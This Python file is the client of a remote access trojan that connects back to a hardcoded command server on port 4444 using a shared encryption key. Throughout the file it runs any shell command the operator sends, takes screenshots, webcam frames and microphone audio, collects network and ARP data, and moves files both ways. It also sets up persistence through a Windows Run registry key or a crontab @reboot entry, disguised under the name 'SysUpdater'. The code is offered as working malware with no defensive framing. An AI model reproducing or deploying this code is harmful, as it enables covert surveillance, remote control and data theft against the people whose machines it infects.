import socket
import subprocess
import time
import os
import platform
import base64
import io
import sys
import shutil
import threading
from cryptography.fernet import Fernet
from pynput import keyboard
from PIL import ImageGrab
import pyaudio
import psutil
import cv2

# Shared encryption key (must match server)
key = "KIVNwL8Ed7yD84YtLV2FSy2aZ-fdTZgXXGFrMsXKGFg="
cipher = Fernet(key)

SERVER_IP = "192.168.1.37"  # Replace with your actual server IP
SERVER_PORT = 4444

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            print("[*] Connected to server.")
            return s
        except Exception as e:
            print(f"[!] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

# Length-prefixed encrypted send
def send_encrypted(s, data):
    try:
        encrypted_data = cipher.encrypt(data)
        length = len(encrypted_data).to_bytes(4, 'big')
        s.sendall(length + encrypted_data)
    except Exception as e:
        print(f"[!] Send error: {e}")
        s.close()
        exit()

# Decrypt commands with length-prefixed framing
def receive_encrypted(s):
    try:
        length_data = s.recv(4)
        if not length_data:
            return None
        length = int.from_bytes(length_data, 'big')
        data = b""
        while len(data) < length:
            chunk = s.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        decrypted_data = cipher.decrypt(data)
        
        try:
            return decrypted_data.decode('utf-8')
        except UnicodeDecodeError:
            return decrypted_data
    except Exception as e:
        print(f"[!] Receive error: {e}")
        return None

def get_sysinfo():
    try:
        info = f"""
OS: {platform.system()} {platform.release()}
User: {os.getlogin()}
Hostname: {platform.node()}
CPU: {platform.processor()}
"""
    except:
        info = "Failed to get system info."
    return info

def capture_screenshot(s):
    try:
        if platform.system().lower() == "linux":
            os.environ["DISPLAY"] = ":0"
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        screenshot_data = buf.getvalue()

        send_encrypted(s, b"[+] Screenshot captured successfully.")
        send_encrypted(s, screenshot_data)
        print("[*] Screenshot sent.")
    except Exception as e:
        send_encrypted(s, f"[!] Screenshot failed: {str(e)}".encode())

def capture_webcam(s):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            is_success, img_encoded = cv2.imencode('.png', frame)
            img_bytes = img_encoded.tobytes()

            send_encrypted(s, b"[+] Webcam capture successful.")
            send_encrypted(s, img_bytes)
            print("[*] Webcam capture sent.")
        else:
            send_encrypted(s, b"[!] Webcam capture failed.")
        cap.release()
    except Exception as e:
        send_encrypted(s, f"[!] Webcam capture error: {e}".encode())

def record_audio(s, duration=5):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16,
                        channels=1,
                        rate=44100,
                        input=True,
                        frames_per_buffer=1024)

        print("[*] Recording audio...")
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        audio_data = b''.join(frames)
        send_encrypted(s, b"[+] Audio recorded successfully.")
        send_encrypted(s, audio_data)
        print("[*] Audio sent.")
    except Exception as e:
        send_encrypted(s, f"[!] Audio recording error: {e}".encode())

def get_network_info(s):
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        interfaces = psutil.net_if_addrs()
        arp_table = os.popen('arp -a').read()

        network_info = f"IP Address: {ip_address}\nInterfaces: {interfaces}\nARP Table:\n{arp_table}"
        send_encrypted(s, network_info.encode())
    except Exception as e:
        send_encrypted(s, f"[!] Network info retrieval error: {e}".encode())

def rotate_encryption_key():
    global cipher
    key = Fernet.generate_key()
    cipher = Fernet(key)
    print("[*] Encryption key rotated.")

def setup_persistence():
    try:
        path = os.path.expanduser("~/.config/.sysupdater.py")
        if platform.system().lower() == "windows":
            import winreg
            exe_path = os.path.realpath(sys.argv[0])
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SysUpdater", 0, winreg.REG_SZ, exe_path)
        else:
            if not os.path.exists(path):
                shutil.copy2(sys.argv[0], path)
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {path}") | crontab -')
    except Exception as e:
        print(f"[!] Persistence error: {e}")

def receive_file(s, filename):
    try:
        length_data = s.recv(4)
        if not length_data:
            return
        length = int.from_bytes(length_data, 'big')
        file_data = b""
        while len(file_data) < length:
            chunk = s.recv(length - len(file_data))
            if not chunk:
                break
            file_data += chunk
        with open(filename, "wb") as f:
            f.write(file_data)
        send_encrypted(s, f"[+] File '{filename}' uploaded successfully.".encode())
    except Exception as e:
        send_encrypted(s, f"[!] File upload failed: {e}".encode())

def send_file(s, filepath):
    try:
        with open(filepath, "rb") as f:
            file_data = f.read()
        length = len(file_data).to_bytes(4, 'big')
        s.sendall(length + file_data)
    except Exception as e:
        send_encrypted(s, f"[!] File send failed: {e}".encode())

def main():
    s = connect_to_server()
    setup_persistence()

    while True:
        try:
            cmd = receive_encrypted(s)
            if not cmd:
                continue

            if cmd.lower() == "exit":
                print("[*] Exiting.")
                break

            elif cmd == "sysinfo":
                send_encrypted(s, get_sysinfo().encode())

            elif cmd == "screenshot":
                threading.Thread(target=capture_screenshot, args=(s,)).start()

            elif cmd == "webcam":
                threading.Thread(target=capture_webcam, args=(s,)).start()

            elif cmd == "record_audio":
                threading.Thread(target=record_audio, args=(s,)).start()

            elif cmd == "network_info":
                get_network_info(s)

            elif cmd == "rotate_key":
                rotate_encryption_key()

            elif cmd.startswith("upload_file"):
                filename = cmd.split(" ", 1)[1]
                receive_file(s, filename)

            elif cmd.startswith("download_file"):
                filename = cmd.split(" ", 1)[1]
                send_file(s, filename)

            else:
                output = subprocess.getoutput(cmd)
                send_encrypted(s, output.encode())

        except Exception as e:
            print(f"[!] Main error: {e}")
            try:
                send_encrypted(s, f"[!] Error: {str(e)}".encode())
            except:
                pass
            break

if __name__ == "__main__":
    main()
